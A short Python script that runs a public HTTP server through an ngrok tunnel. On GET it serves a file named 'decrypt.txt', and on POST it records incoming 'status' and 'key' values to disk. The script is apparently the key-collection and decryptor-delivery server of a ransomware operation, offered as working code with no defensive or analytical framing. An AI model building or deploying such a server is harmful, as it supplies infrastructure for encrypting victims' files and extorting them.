import ast
from http.server import HTTPServer, BaseHTTPRequestHandler
from pyngrok import ngrok, conf

conf.get_default().auth_token = "<NGROK_AUTH_TOKEN>"

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        #self.send_header("Content-type", "text/html")
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        f = open('decrypt.txt','rb')
        while True:
            file_data = f.read(32768)
            if file_data is None or len(file_data) == 0:
                break
            self.wfile.write(file_data)
        f.close()
    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        self._set_headers()
        LIST = ast.literal_eval(post_data.decode('utf-8')) # <-- Convert string to list by removing ''
        print(f"status: {LIST[0]}")
        print(f"key: {LIST[1]}")
        status = LIST[0]
        key = LIST[1]
        FILE = open("server_data/data.txt", 'w')
        FILE.write("\n".join(LIST))
        FILE.close()


def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=8000):
    try:
        server_address = (addr, port)
        httpd = server_class(server_address, handler_class)

        url = ngrok.connect(port)
        print(f"Starting httpd server on {url}")
        print()
        httpd.serve_forever()
        ngrok_tunnel = ngrok.connect()  
    except KeyboardInterrupt:
        httpd.__exit__()
        print("SERVER IS OFFLINE")
        exit()

if __name__ == "__main__":
    run()